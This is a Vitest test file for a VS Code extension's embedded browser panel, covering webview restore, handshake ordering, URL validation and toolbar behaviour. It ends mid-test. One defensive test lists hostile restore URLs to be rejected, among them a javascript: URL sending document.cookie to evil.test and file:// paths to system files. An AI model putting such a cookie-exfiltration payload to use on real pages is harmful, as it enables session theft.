// @vitest-environment happy-dom
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { readFileSync } from 'fs';
import { join } from 'path';
import * as vscode from 'vscode';
import { BrowserService } from '../index';
import { BrowserPanel } from '../browser-panel';
import { BROWSER_WEBVIEW_SCRIPT } from '../browser-webview-script';
// Statically imported so the cost of pulling extension.ts's module graph (chat panel, pi-runtime,
// voice, checkpoints) is paid once during collection rather than inside a test's 5s timeout budget.
// Importing it does NOT run `activate()`; `restoredBrowserUrl` is a pure exported function.
import { restoredBrowserUrl } from '../../extension';
import { __webviewPanels, type FakeWebviewPanel } from 'vscode';

/**
 * Slice 2 acceptance suite — host side: hidden-tab teardown, the `ready` handshake as the single
 * ordering authority, panel truth (no unreachable disconnected/clipboard state), toolbar history
 * through Playwright, watchdog gating, and localisation.
 *
 * Drives the REAL `BrowserService` and the REAL `BrowserPanel` against fake Playwright pages/CDP
 * sessions, using the `Priv` cast idiom from `tab-panels-units.test.ts`. Panel visibility and the
 * webview→host `ready` post are driven through the vscode mock's `setVisible` / `fireMessage`, so the
 * real `onDidChangeViewState` → `onVisibilityChange` and `onDidReceiveMessage` → `onReady` wiring runs
 * exactly as it does in VS Code.
 *
 * Every `describe` maps to an acceptance bullet in the mission brief; the bullet is quoted on it.
 */

// Kept inert: these suites never launch a real Chromium (they set `context` directly), but importing
// index.ts pulls the launcher in, and mocking it here matches tab-panels-units.test.ts.
vi.mock('../launcher', () => ({ launchBrowserContext: vi.fn() }));

type Handler = (...args: unknown[]) => unknown;

/** A fake Playwright page whose history methods are spies — T3 asserts the toolbar goes through these. */
function fakePage(url = 'about:blank') {
  return {
    on: (_e: string, _h: Handler) => {},
    url: () => url,
    close: vi.fn(async () => {}),
    opener: async () => null,
    goBack: vi.fn(async () => null),
    goForward: vi.fn(async () => null),
    reload: vi.fn(async () => null),
  };
}

/** A CDP session whose `send` resolves — the real PageController runs on top of it, allow-list and all. */
function fakeSession() {
  return { on: (_e: string, _h: Handler) => {}, send: vi.fn(async () => ({})), detach: vi.fn(async () => {}) };
}

interface TestEntry {
  page: ReturnType<typeof fakePage>;
  session: { send: ReturnType<typeof vi.fn> };
  panel: BrowserPanel;
  controller: {
    ackScreencastFrame: (sessionId: number) => Promise<void>;
    startScreencast: (o?: unknown) => Promise<void>;
    stopScreencast: () => Promise<void>;
    setViewport: (w: number, h: number, dpr?: number) => Promise<void>;
  };
  picker: { readonly isPicking: boolean };
  health: { noteStart: (now?: number) => void; shouldRestart: (n: number, v: boolean, c: boolean) => boolean };
  lastFrame: { bytes: Buffer; deviceWidth: number; deviceHeight: number } | null;
  lastUrl: string | null;
  lastCursor: string | null;
  wantsStream: boolean;
  pendingAck: { sessionId: number; frameId: number; timer: unknown } | null;
  nextFrameId: number;
  viewport: { width: number; height: number; dpr: number };
  watchdogFailureStreak: number;
  watchdogSkipTicks: number;
}

type Priv = {
  context: unknown;
  pages: Map<unknown, TestEntry>;
  state: string;
  activePage: unknown;
  currentUrl: string | null;
  watchdogTimer: unknown;
  registerPage: (p: unknown, ownerScopeId?: string) => Promise<TestEntry | null>;
  setActivePage: (p: unknown) => void;
  handlePageClosed: (p: unknown) => void;
  onScreencastFrame: (entry: unknown, frame: unknown) => void;
  handleContextGone: (ctx: unknown) => void;
  resyncPanel: (entry: unknown) => void;
  startScreencast: (entry: unknown) => Promise<void>;
};
/**
 * Slice 6 moved the screencast state machine onto `ScreencastController`. This proxy keeps the tests
 * addressing the service by the OLD names while every call lands on the REAL controller instance the
 * service owns — so these assertions still drive production code, not a copy.
 */
const MOVED_TO_SCREENCAST: Record<string, string> = {
  onScreencastFrame: 'onFrame',
  onFrameRendered: 'onFrameRendered',
  releasePendingAck: 'releasePendingAck',
  screencastOptions: 'options',
  startWatchdog: 'startWatchdog',
  clearWatchdog: 'clearWatchdog',
  startScreencast: 'start',
};
const priv = (s: BrowserService): Priv =>
  new Proxy(s as unknown as Priv, {
    get(target, prop: string, receiver) {
      // The watchdog interval handle moved with the state machine; read it off the controller.
      if (prop === 'watchdogTimer') {
        return (target as unknown as { screencast: { watchdogTimer: unknown } }).screencast.watchdogTimer;
      }
      const moved = MOVED_TO_SCREENCAST[prop];
      if (moved) {
        const ctrl = (target as unknown as { screencast: Record<string, (...a: unknown[]) => unknown> }).screencast;
        return (...args: unknown[]) => ctrl[moved]!(...args);
      }
      return Reflect.get(target, prop, receiver);
    },
    set(target, prop, value, receiver) {
      return Reflect.set(target, prop, value, receiver);
    },
  });

/** The FakeWebviewPanel underneath a BrowserPanel (the mock's test handles). */
function panelOf(entry: TestEntry): FakeWebviewPanel {
  return (entry.panel as unknown as { panel: FakeWebviewPanel }).panel;
}

/** Message types posted host→webview, in order. The resync ordering assertions read this. */
function postedTypes(panel: FakeWebviewPanel): string[] {
  return panel.posted.map((m) => (m as { type: string }).type);
}

async function makeService(): Promise<BrowserService> {
  const service = new BrowserService();
  priv(service).context = { newCDPSession: async () => fakeSession(), close: async () => {} };
  priv(service).state = 'connected';
  return service;
}

/**
 * Register a page and return its entry with the CDP-facing controller methods spied. `calls` records
 * the ordering of every observable side effect — the resync-before-first-frame criterion is an
 * assertion about this array, not about internal state.
 */
async function addTab(service: BrowserService, url = 'http://a'): Promise<{
  entry: TestEntry;
  page: ReturnType<typeof fakePage>;
  start: ReturnType<typeof vi.spyOn>;
  stop: ReturnType<typeof vi.spyOn>;
  push: ReturnType<typeof vi.spyOn>;
  calls: string[];
}> {
  const page = fakePage(url);
  await priv(service).registerPage(page, BrowserService.PRIMARY_SCOPE_ID);
  const entry = priv(service).pages.get(page)!;
  const calls: string[] = [];
  vi.spyOn(entry.controller, 'ackScreencastFrame').mockImplementation(async () => {});
  const start = vi.spyOn(entry.controller, 'startScreencast').mockImplementation(async () => {
    calls.push('startScreencast');
  });
  const stop = vi.spyOn(entry.controller, 'stopScreencast').mockImplementation(async () => {
    calls.push('stopScreencast');
  });
  vi.spyOn(entry.controller, 'setViewport').mockImplementation(async () => {});
  const push = vi.spyOn(entry.panel, 'pushFrame');
  return { entry, page, start, stop, push, calls };
}

/** A CDP screencast frame as Chromium delivers it (base64 payload + its own ack sessionId). */
function cdpFrame(sessionId: number, deviceWidth = 800, deviceHeight = 600) {
  return {
    data: Buffer.from(`frame-${sessionId}`).toString('base64'),
    metadata: { deviceWidth, deviceHeight },
    sessionId,
  };
}

/** The webview's `ready` handshake, as the real script posts it. */
function fireReady(entry: TestEntry): void {
  panelOf(entry).fireMessage({ type: 'ready' });
}

/**
 * Put an entry's picker into the picking state. `ElementPicker.isPicking` is a getter over a private
 * field, so it cannot be assigned; `startPicking()` is the real way in. Its promise stays pending
 * until an element is picked, so it is deliberately not awaited — the CDP calls it makes are stubbed.
 */
function beginPicking(entry: TestEntry): void {
  const picker = entry.picker as unknown as {
    startPicking: () => Promise<unknown>;
    cdp: { setInspectMode: (v: boolean) => Promise<void> };
  };
  vi.spyOn(picker.cdp, 'setInspectMode').mockImplementation(async () => {});
  void picker.startPicking().catch(() => {});
}

const SRC_DIR = join(__dirname, '..');
const readSrc = (name: string): string => readFileSync(join(SRC_DIR, name), 'utf8');

/** Set `damocles.browser.enabled`, which gates the restore path. The mock's default `get` returns the
 *  caller's default, so the shipped default (false) is what an unstubbed test sees. */
function withBrowserEnabled(enabled: boolean): void {
  vi.spyOn(vscode.workspace, 'getConfiguration').mockReturnValue({
    get: (key: string, defaultValue?: unknown) => (key === 'browser.enabled' ? enabled : defaultValue),
    update: () => Promise.resolve(),
  } as unknown as vscode.WorkspaceConfiguration);
}

beforeEach(() => {
  __webviewPanels.length = 0;
});

afterEach(() => {
  vi.useRealTimers();
  vi.restoreAllMocks();
});

// ── Acceptance: "Hiding a browser tab tears down its webview; re-showing restores url bar, viewport,
//    picking state, cursor and last frame WITH NO USER ACTION, and resumes the stream." ────────────

describe('hide → show restores the whole panel with no user action', () => {
  it('replays url, viewport, picking state, cursor and the last frame on ready, in that order', async () => {
    const service = await makeService();
    const { entry } = await addTab(service, 'http://example.test/page');
    const panel = panelOf(entry);
    // Give the entry a full state to restore: a url, a non-default viewport, an active pick, a
    // page-pushed cursor, and a cached frame. None of these is reachable from a fresh webview.
    entry.lastUrl = 'http://example.test/page';
    entry.viewport = { width: 1024, height: 768, dpr: 1 };
    beginPicking(entry);
    expect(entry.picker.isPicking).toBe(true);
    entry.lastCursor = 'pointer';
    panel.setVisible(true);
    fireReady(entry);
    priv(service).onScreencastFrame(entry, cdpFrame(1, 1024, 768));
    expect(entry.lastFrame).not.toBeNull();

    // The user hides the tab (switches editor tabs) and later comes back. VS Code destroys the
    // webview on hide and builds a fresh one on show — every field above is gone from the DOM.
    panel.setVisible(false);
    await Promise.resolve();
    panel.posted.length = 0;
    panel.setVisible(true);
    fireReady(entry);

    // The whole panel state is replayed, unprompted, in the contract's order.
    expect(postedTypes(panel)).toEqual([
      'urlChanged',
      'viewport',
      'pickingStateChanged',
      'cursor',
      'frame',
    ]);
    expect(panel.posted[0]).toEqual({ type: 'urlChanged', url: 'http://example.test/page' });
    expect(panel.posted[1]).toEqual({ type: 'viewport', width: 1024, height: 768 });
    expect(panel.posted[2]).toEqual({ type: 'pickingStateChanged', picking: true });
    expect(panel.posted[3]).toEqual({ type: 'cursor', cursor: 'pointer' });
    expect(panel.posted[4]).toMatchObject({ type: 'frame', width: 1024, height: 768 });
    service.dispose();
  });

  it('resumes the stream after the replay — and only after it', async () => {
    const service = await makeService();
    const { entry, calls } = await addTab(service);
    const panel = panelOf(entry);
    panel.setVisible(true);
    fireReady(entry);
    panel.setVisible(false);
    await Promise.resolve();
    calls.length = 0;

    panel.setVisible(true);
    await Promise.resolve();
    // Nothing yet: the webview exists but its listener is not attached, so a stream started here
    // would push frames into a void.
    expect(calls).not.toContain('startScreencast');

    fireReady(entry);
    await Promise.resolve();

    expect(calls).toContain('startScreencast');
    // And the replay landed before the stream resumed, so the first live frame meets a synced webview.
    expect(postedTypes(panel).indexOf('viewport')).toBeGreaterThanOrEqual(0);
    service.dispose();
  });

  it('replays a NEVER-CURSORED entry as `default` rather than posting nothing', async () => {
    const service = await makeService();
    const { entry } = await addTab(service);
    const panel = panelOf(entry);
    // The cursor is push-only from the page, so a tab that never saw a mousemove has none. Skipping
    // the post would leave the fresh webview on whatever CSS default it booted with.
    expect(entry.lastCursor).toBeNull();
    panel.setVisible(true);

    fireReady(entry);

    expect(panel.posted).toContainEqual({ type: 'cursor', cursor: 'default' });
    service.dispose();
  });

  it('tracks the page-pushed cursor on the entry so it survives the webview teardown', async () => {
    const service = await makeService();
    const { entry, page } = await addTab(service);
    const panel = panelOf(entry);
    panel.setVisible(true);
    fireReady(entry);

    // The page reports a cursor change through the context binding (installContextObservers).
    (service as unknown as { onCursorBinding: (p: unknown, c: string) => void }).onCursorBinding(page, 'text');

    expect(entry.lastCursor).toBe('text');
    panel.setVisible(false);
    await Promise.resolve();
    panel.posted.length = 0;
    panel.setVisible(true);
    fireReady(entry);
    expect(panel.posted).toContainEqual({ type: 'cursor', cursor: 'text' });
    service.dispose();
  });

  it('replays a NOT-picking entry as false — the state is asserted, not assumed', async () => {
    const service = await makeService();
    const { entry } = await addTab(service);
    const panel = panelOf(entry);
    expect(entry.picker.isPicking).toBe(false);
    panel.setVisible(true);

    fireReady(entry);

    expect(panel.posted).toContainEqual({ type: 'pickingStateChanged', picking: false });
    service.dispose();
  });

  it('is idempotent: a second ready (webview reloaded again) replays the same state, not a mutated one', async () => {
    const service = await makeService();
    const { entry } = await addTab(service);
    const panel = panelOf(entry);
    entry.lastUrl = 'http://a/x';
    entry.viewport = { width: 640, height: 480, dpr: 1 };
    panel.setVisible(true);
    fireReady(entry);
    priv(service).onScreencastFrame(entry, cdpFrame(1, 640, 480));
    panel.posted.length = 0;

    fireReady(entry);
    const first = [...panel.posted];
    // A resync that posts NOTHING would satisfy "identical twice" vacuously.
    expect(first.map((m) => (m as { type: string }).type)).toEqual([
      'urlChanged', 'viewport', 'pickingStateChanged', 'cursor', 'frame',
    ]);
    panel.posted.length = 0;
    fireReady(entry);

    expect(postedTypes(panel)).toEqual(first.map((m) => (m as { type: string }).type));
    expect(panel.posted[0]).toEqual(first[0]);
    expect(panel.posted[1]).toEqual(first[1]);
    service.dispose();
  });

  it('does not push a frame on ready when the entry has never had one', async () => {
    const service = await makeService();
    const { entry, push } = await addTab(service);
    panelOf(entry).setVisible(true);
    panelOf(entry).posted.length = 0;

    fireReady(entry);

    expect(entry.lastFrame).toBeNull();
    expect(push).not.toHaveBeenCalled();
    // The other four replay posts DID happen, so this is "no frame", not "no resync at all".
    expect(postedTypes(panelOf(entry))).toEqual(['urlChanged', 'viewport', 'pickingStateChanged', 'cursor']);
    service.dispose();
  });
});

// ── Acceptance: "`resyncPanel` runs before the first `pushFrame` after every hide→show cycle
//    (asserted on call order), and the screencast is started from `ready`, never from visibility." ──

describe('ready is the single ordering authority', () => {
  it('runs resyncPanel BEFORE the first pushFrame after a hide→show cycle — asserted on call order', async () => {
    const service = await makeService();
    const { entry } = await addTab(service);
    const panel = panelOf(entry);
    panel.setVisible(true);
    fireReady(entry);
    priv(service).onScreencastFrame(entry, cdpFrame(1));
    panel.setVisible(false);
    await Promise.resolve();

    // Record the ACTUAL call order across the two functions. A viewport replayed after the first frame
    // would put every subsequent input event on the wrong coordinate space.
    const order: string[] = [];
    const resyncSpy = vi
      .spyOn(service as unknown as { resyncPanel: (e: unknown) => void }, 'resyncPanel')
      .mockImplementation(function (this: unknown, e: unknown) {
        order.push('resyncPanel');
        // Call through: the replay must still happen, or the rest of the cycle is not under test.
        return (BrowserService.prototype as unknown as { resyncPanel: (e: unknown) => void })
          .resyncPanel.call(service, e);
      });
    vi.spyOn(entry.panel, 'pushFrame').mockImplementation(() => { order.push('pushFrame'); });

    panel.setVisible(true);
    fireReady(entry);
    priv(service).onScreencastFrame(entry, cdpFrame(2));

    expect(resyncSpy).toHaveBeenCalledTimes(1);
    expect(order[0]).toBe('resyncPanel');
    expect(order.indexOf('resyncPanel')).toBeLessThan(order.indexOf('pushFrame'));
    service.dispose();
  });

  it('VISIBILITY ALONE starts no screencast and posts no frame — the ordering hole is closed', async () => {
    const service = await makeService();
    const { entry, start, push } = await addTab(service);
    const panel = panelOf(entry);
    panel.setVisible(true);
    fireReady(entry);
    priv(service).onScreencastFrame(entry, cdpFrame(1)); // give it a lastFrame worth replaying
    panel.setVisible(false);
    await Promise.resolve();
    start.mockClear();
    push.mockClear();
    panel.posted.length = 0;

    panel.setVisible(true);
    await Promise.resolve();
    await Promise.resolve();

    // A post issued here reaches a webview whose message listener is not attached yet and is silently
    // dropped (VS Code: posting to a hidden/booting webview is not delivered). Nothing may be sent.
    expect(start).not.toHaveBeenCalled();
    expect(push).not.toHaveBeenCalled();
    expect(panel.posted).toEqual([]);
    service.dispose();
  });

  it('READY starts the screencast — the other half of the same criterion', async () => {
    const service = await makeService();
    const { entry, start } = await addTab(service);
    const panel = panelOf(entry);
    panel.setVisible(true);
    start.mockClear();

    fireReady(entry);
    await Promise.resolve();

    expect(start).toHaveBeenCalledTimes(1);
    service.dispose();
  });

  it('a ready arriving on an already-hidden panel starts NO stream (the wantsStream gate)', async () => {
    const service = await makeService();
    const { entry, start } = await addTab(service);
    const panel = panelOf(entry);
    panel.setVisible(true);
    // `ready` is asynchronous: the human can hide the tab again between the webview posting it and the
    // host handling it. Starting a stream into a dead webview is the exact bug this slice removes.
    panel.setVisible(false);
    await Promise.resolve();
    start.mockClear();

    fireReady(entry);
    await Promise.resolve();

    expect(start).not.toHaveBeenCalled();
    expect(entry.wantsStream).toBe(false);
    service.dispose();
  });

  it('resyncs even when the stream is not wanted — state replay and streaming are independent', async () => {
    const service = await makeService();
    const { entry, start } = await addTab(service);
    const panel = panelOf(entry);
    entry.lastUrl = 'http://a/y';
    panel.setVisible(true);
    panel.setVisible(false);
    await Promise.resolve();
    panel.posted.length = 0;
    start.mockClear();

    fireReady(entry);
    await Promise.resolve();

    expect(postedTypes(panel)).toContain('urlChanged');
    expect(start).not.toHaveBeenCalled();
    service.dispose();
  });

  it('hiding releases the pending ack BEFORE stopping the stream, and clears wantsStream', async () => {
    const service = await makeService();
    const { entry, calls } = await addTab(service);
    const panel = panelOf(entry);
    panel.setVisible(true);
    fireReady(entry);
    priv(service).onScreencastFrame(entry, cdpFrame(77));
    const ackSpy = vi.spyOn(entry.controller, 'ackScreencastFrame').mockImplementation(async (id: number) => {
      calls.push(`ack:${id}`);
    });
    calls.length = 0;

    panel.setVisible(false);
    await Promise.resolve();

    // Slice 1 ordering preserved: the ack must reach a session that is still streaming.
    expect(ackSpy).toHaveBeenCalledWith(77);
    expect(calls.indexOf('ack:77')).toBeLessThan(calls.indexOf('stopScreencast'));
    expect(entry.pendingAck).toBeNull();
    expect(entry.wantsStream).toBe(false);
    service.dispose();
  });
});

// ── Acceptance: "The webview is created with `localResourceRoots: []`." (S7 + P5) ────────────────

describe('S7/P5 — panel construction options', () => {
  it('creates the webview with EXACTLY { enableScripts: true, localResourceRoots: [] }', () => {
    const panel = new BrowserPanel();

    panel.show('http://a');

    const created = __webviewPanels[0]!;
    expect(created.createOptions).toEqual({ enableScripts: true, localResourceRoots: [] });
    panel.dispose();
  });

  it('sets NO retainContextWhenHidden — a hidden tab must cost no renderer (P5)', () => {
    const panel = new BrowserPanel();

    panel.show('http://a');

    // Asserted as absent rather than false: it lives on WebviewPanelOptions, is fixed at creation, and
    // cannot be reassigned on a live panel, so `false` and absent are equivalent — but leaving the key
    // present invites someone to flip it back.
    expect(__webviewPanels[0]!.createOptions).not.toHaveProperty('retainContextWhenHidden');
    panel.dispose();
  });

  it('deny-by-default localResourceRoots matches the panel CSP: it loads no local resources', () => {
    const panel = new BrowserPanel();

    panel.show('http://a');

    const created = __webviewPanels[0]!;
    expect(created.createOptions!['localResourceRoots']).toEqual([]);
    // The CSP the same html ships must agree — `default-src 'none'` with no resource roots.
    expect(created.webview.html).toContain("default-src 'none'");
    panel.dispose();
  });
});

// ── Acceptance: "a deserialized panel is disposed and recreated rather than adopted." ────────────

describe('a deserialized panel is DISPOSED and recreated, never adopted', () => {
  it('disposes the handed-in panel and gives the page a DIFFERENT, correctly-configured one', async () => {
    // A genuine restore: NO existing context, so restorePanel runs its real launch+adopt path rather
    // than short-circuiting on the already-claimed guard. That is the branch that used to ADOPT.
    withBrowserEnabled(true);
    const service = new BrowserService();
    const p = service as unknown as { userDataDir: string; iconCacheDir: string; downloadManager: { downloadsDir: string } };
    p.userDataDir = '/tmp/damocles-restore';
    p.iconCacheDir = '/tmp/damocles-restore/icons';
    p.downloadManager.downloadsDir = '/tmp/damocles-restore/dl';
    const page = {
      on: () => {}, url: () => 'http://restored', close: vi.fn(async () => {}),
      opener: async () => null, evaluate: async () => 'Mozilla/5.0 Chrome/120',
    };
    vi.mocked(await import('../launcher')).launchBrowserContext.mockResolvedValue({
      exposeBinding: vi.fn(async () => {}), addInitScript: vi.fn(async () => {}), on: () => {},
      pages: () => [page], newPage: vi.fn(),
      newCDPSession: async () => ({ on: () => {}, send: vi.fn(async () => ({})), detach: async () => {} }),
      close: async () => {},
    } as never);

    // The panel VS Code hands back on window reload, carrying the OLD extension version's options.
    // `retainContextWhenHidden` is fixed at createWebviewPanel time and CANNOT be reassigned on a
    // live panel, so adopting it would silently keep a renderer alive for the whole window session.
    const restored = vscode.window.createWebviewPanel('damocles-browser-view', 'old', {}, {
      enableScripts: true, retainContextWhenHidden: true,
    }) as unknown as vscode.WebviewPanel;
    const disposeSpy = vi.spyOn(restored, 'dispose');

    await service.restorePanel(restored, 'http://restored');

    expect(disposeSpy).toHaveBeenCalledTimes(1);
    const entry = priv(service).pages.get(page)!;
    expect(entry).toBeDefined();
    // A DIFFERENT object, built by the one construction path, with this version's options.
    expect(panelOf(entry)).not.toBe(restored);
    expect(panelOf(entry).createOptions).toEqual({ enableScripts: true, localResourceRoots: [] });
    expect(panelOf(entry).createOptions).not.toHaveProperty('retainContextWhenHidden');
    service.dispose();
  });

  it('has no pendingAdoptPanel field and no BrowserPanel.restore(): one construction path only', async () => {
    const service = await makeService();

    expect(service).not.toHaveProperty('pendingAdoptPanel');
    expect(new BrowserPanel()).not.toHaveProperty('restore');
    expect((BrowserPanel.prototype as unknown as Record<string, unknown>)['restore']).toBeUndefined();
    // And the source carries no adoption branch at all.
    expect(readSrc('index.ts')).not.toContain('pendingAdoptPanel');
    service.dispose();
  });

  it('does NOT relaunch Chromium when damocles.browser.enabled is off', async () => {
    // A persisted browser tab outlives the setting that created it, so the first window reload after
    // the user disables the feature is exactly when it would resurrect itself — relaunching Chromium
    // against the logged-in profile, which is the one thing turning the setting off is meant to stop.
    withBrowserEnabled(false);
    const launch = vi.mocked(await import('../launcher')).launchBrowserContext;
    launch.mockClear();
    const service = new BrowserService();
    const restored = vscode.window.createWebviewPanel('damocles-browser-view', 'old', {}, {}) as unknown as vscode.WebviewPanel;
    const disposeSpy = vi.spyOn(restored, 'dispose');

    await service.restorePanel(restored, 'http://restored');

    expect(launch).not.toHaveBeenCalled();
    expect(priv(service).pages.size).toBe(0);
    // The stale editor tab is still disposed: leaving it on screen would be a browser tab with no
    // browser behind it.
    expect(disposeSpy).toHaveBeenCalledTimes(1);
    service.dispose();
  });

  it('disposes an EXTRA restored panel when the session is already claimed', async () => {
    const service = await makeService();
    const extra = vscode.window.createWebviewPanel('damocles-browser-view', 'extra', {}, {}) as unknown as vscode.WebviewPanel;
    const disposeSpy = vi.spyOn(extra, 'dispose');

    // A second persisted browser tab: the fresh Chromium context cannot be reconnected to it.
    await service.restorePanel(extra, 'http://second');

    expect(disposeSpy).toHaveBeenCalledTimes(1);
    service.dispose();
  });
});

// ── Acceptance: "A restored URL that is not http/https is not navigated to." (S8) ────────────────

describe('S8 — a restored URL that is not http/https is not navigated to', () => {
  it('rejects every non-http(s) scheme and falls back to about:blank', () => {
    // The panel persists every PAGE-CONTROLLED url via vscode.setState, so a hostile page can plant
    // any of these and have it navigated on the next window reload.
    for (const url of [
      'file:///c:/Windows/System32/drivers/etc/hosts',
      'vscode-file://vscode-app/etc/passwd',
      'javascript:fetch("http://evil.test?c="+document.cookie)',
      'data:text/html,<script>alert(1)</script>',
      'chrome://settings',
      'about:config',
      'ftp://evil.test/x',
      'HTTPS\u200b://not-really.test',
    ]) {
      expect(restoredBrowserUrl({ url })).toBe('about:blank');
    }
  });

  it('passes http and https through unchanged, including ports, paths and queries', () => {
    for (const url of [
      'http://example.test/',
      'https://example.test/deep/path?q=1&r=2#frag',
      'http://127.0.0.1:3000/app',
      'https://user:pass@example.test/',
    ]) {
      expect(restoredBrowserUrl({ url })).toBe(url);
    }
  });

  it('never throws on a malformed, missing or non-string url', () => {
    for (const state of [null, undefined, {}, { url: '' }, { url: 'not a url' }, { url: 42 }, { url: {} }, 'nonsense', []]) {
      expect(restoredBrowserUrl(state)).toBe('about:blank');
    }
  });

  it('the deserializer routes the persisted state through the validator, not through `|| about:blank`', () => {
    const src = readFileSync(join(SRC_DIR, '..', 'extension.ts'), 'utf8');
    const deserializer = src.slice(src.indexOf('damocles-browser-view'));

    expect(deserializer).toContain('restoredBrowserUrl');
    // The pre-slice check was `(state as {url?: string})?.url || 'about:blank'` — a scheme-blind
    // truthiness test. It must not survive alongside the validator.
    expect(deserializer.slice(0, 600)).not.toMatch(/\?\.url\s*\|\|\s*['"]about:blank['"]/);
  });
});

// ── Acceptance: "`setConnectionState`, `writeClipboard`, `#disconnected-overlay`, the
//    `clipboardWrite` branch and `.dimmed` do not exist ANYWHERE." (C9) ───────────────────────────

describe('C9 — the unreachable disconnected/clipboard model is gone from every layer', () => {
  // "Anywhere" is a claim about source, so it is proven against source. A behavioural test could only
  // ever show one call site is gone, never that none remains.
  const layers = () => ({
    'browser-panel.ts': readSrc('browser-panel.ts'),
    'browser-webview-script.ts': readSrc('browser-webview-script.ts'),
    'index.ts': readSrc('index.ts'),
  });

  it.each([
    ['setConnectionState'],
    ['writeClipboard'],
    ['disconnected-overlay'],
    ['disconnectedOverlay'],
    ['clipboardWrite'],
    ['connectionState'],
    ['dimmed'],
  ])('no layer mentions %s', (needle) => {
    for (const [file, src] of Object.entries(layers())) {
      expect(`${file}:${src.includes(needle)}`).toBe(`${file}:false`);
    }
  });

  it('the rendered panel html contains no disconnected overlay and no .dimmed rule', () => {
    const panel = new BrowserPanel();
    panel.show('http://a');
    const html = __webviewPanels[0]!.webview.html;

    expect(html).not.toContain('disconnected-overlay');
    expect(html).not.toContain('dimmed');
    // The elements the script DOES query must still exist, or deleting the markup breaks the webview.
    for (const id of ['btn-back', 'btn-forward', 'btn-reload', 'btn-pick', 'btn-devtools', 'btn-newtab',
      'url-input', 'screen', 'placeholder', 'content-area', 'element-overlay']) {
      expect(html).toContain(`id="${id}"`);
    }
    panel.dispose();
  });

  it('BrowserPanel exposes neither method, so nothing can resurrect the unreachable state', () => {
    const panel = new BrowserPanel();

    expect((panel as unknown as Record<string, unknown>)['setConnectionState']).toBeUndefined();
    expect((panel as unknown as Record<string, unknown>)['writeClipboard']).toBeUndefined();
    panel.dispose();
  });

  it('the webview ignores a connectionState/clipboardWrite message instead of acting on it', () => {
    // Belt-and-braces on the source scan: even if a stale host posted one, no branch handles it.
    expect(BROWSER_WEBVIEW_SCRIPT).not.toMatch(/d\.type\s*===\s*'connectionState'/);
    expect(BROWSER_WEBVIEW_SCRIPT).not.toMatch(/d\.type\s*===\s*'clipboardWrite'/);
  });
});

// ── Acceptance: "an unexpected Chrome exit produces exactly one localised warning." (step 8) ─────

describe('an unexpected Chrome exit produces EXACTLY ONE localised warning', () => {
  it('warns once, through l10n, when the context closes on its own', async () => {
    const warn = vi.spyOn(vscode.window, 'showWarningMessage');
    const translate = vi.spyOn(vscode.l10n, 't');
    const service = await makeService();
    const context = priv(service).context;
    await addTab(service);

    priv(service).handleContextGone(context);
    await Promise.resolve();

    expect(warn).toHaveBeenCalledTimes(1);
    // Localised, not a hardcoded literal: the message the user sees came out of l10n.t.
    const shown = warn.mock.calls[0]![0] as string;
    expect(translate.mock.results.some((r) => r.value === shown)).toBe(true);
    service.dispose();
  });

  it('warns exactly ONCE even when a superseded context fires close afterwards', async () => {
    const warn = vi.spyOn(vscode.window, 'showWarningMessage');
    const service = await makeService();
    const live = priv(service).context;
    const superseded = { newCDPSession: async () => fakeSession(), close: async () => {} };
    await addTab(service);

    priv(service).handleContextGone(live);
    priv(service).handleContextGone(superseded);
    priv(service).handleContextGone(live);
    await Promise.resolve();

    expect(warn).toHaveBeenCalledTimes(1);
    service.dispose();
  });

  it('does NOT warn on an intentional close — that is not an unexpected exit', async () => {
    const warn = vi.spyOn(vscode.window, 'showWarningMessage');
    const service = await makeService();
    await addTab(service);

    await service.close();

    expect(warn).not.toHaveBeenCalled();
    service.dispose();
  });
});

// ── Acceptance: "Toolbar Back/Forward/Reload work on a page that overrides window.history.back and
//    location.reload, and issue no Runtime.evaluate." (T3) ────────────────────────────────────────

describe('T3 — toolbar history goes through Playwright, never through page-overridable JS', () => {
  it.each([
    ['goBack', 'goBack'],
    ['goForward', 'goForward'],
    ['reload', 'reload'],
  ])('%s drives page.%s and sends no Runtime.evaluate', async (message, method) => {
    const service = await makeService();
    const { entry, page } = await addTab(service);
    const panel = panelOf(entry);
    panel.setVisible(true);
    fireReady(entry);
    entry.session.send.mockClear();

    panel.fireMessage({ type: message });
    await Promise.resolve();
    await Promise.resolve();

    expect(page[method as 'goBack']).toHaveBeenCalledTimes(1);
    // The pre-slice implementation ran `history.back()` in the MAIN WORLD, so any page could override
    // it and hijack the toolbar. Asserting on CDP traffic proves the hijack surface is gone entirely.
    const methods = entry.session.send.mock.calls.map((c) => c[0]);
    expect(methods).not.toContain('Runtime.evaluate');
    expect(methods).not.toContain('Runtime.callFunctionOn');
    service.dispose();
  });

  it('drives the OWNING tab, not the active one, under split view', async () => {
    const service = await makeService();
    const a = await addTab(service, 'http://a');
    const b = await addTab(service, 'http://b');
    panelOf(a.entry).setVisible(true);
    panelOf(b.entry).setVisible(true);
    priv(service).setActivePage(a.page);

    panelOf(b.entry).fireMessage({ type: 'goBack' });
    await Promise.resolve();

    expect(b.page.goBack).toHaveBeenCalledTimes(1);
    expect(a.page.goBack).not.toHaveBeenCalled();
    service.dispose();
  });

  it('logs rather than throwing when there is no history entry to go back to', async () => {
    const service = await makeService();
    const { entry, page } = await addTab(service);
    page.goBack.mockRejectedValue(new Error('no history entry'));
    const panel = panelOf(entry);
    panel.setVisible(true);

    expect(() => panel.fireMessage({ type: 'goBack' })).not.toThrow();
    await Promise.resolve();
    await Promise.resolve();

    expect(page.goBack).toHaveBeenCalledTimes(1);
    service.dispose();
  });

  it('the source no longer evaluates history.back / history.forward / location.reload', () => {
    const src = readSrc('index.ts');

    expect(src).not.toContain('history.back()');
    expect(src).not.toContain('history.forward()');
    expect(src).not.toContain('location.reload()');
  });
});

// ── Acceptance: "The watchdog interval exists only while a browser panel is visible, and hiding a
//    tab does not reset any entry's backoff streak." (P6) ─────────────────────────────────────────

describe('P6 — the watchdog runs only while a panel is visible', () => {
  it('is not running with every panel hidden, starts on show, and stops again on hide', async () => {
    vi.useFakeTimers();
    const service = await makeService();
    const { entry } = await addTab(service);
    const panel = panelOf(entry);
    panel.setVisible(false);
    await Promise.resolve();

    expect(priv(service).watchdogTimer).toBeNull();

    panel.setVisible(true);
    expect(priv(service).watchdogTimer).not.toBeNull();

    panel.setVisible(false);
    await Promise.resolve();
    expect(priv(service).watchdogTimer).toBeNull();
    service.dispose();
  });

  it('keeps ticking while ANY panel is visible, and stops only when the last one hides', async () => {
    vi.useFakeTimers();
    const service = await makeService();
    const a = await addTab(service, 'http://a');
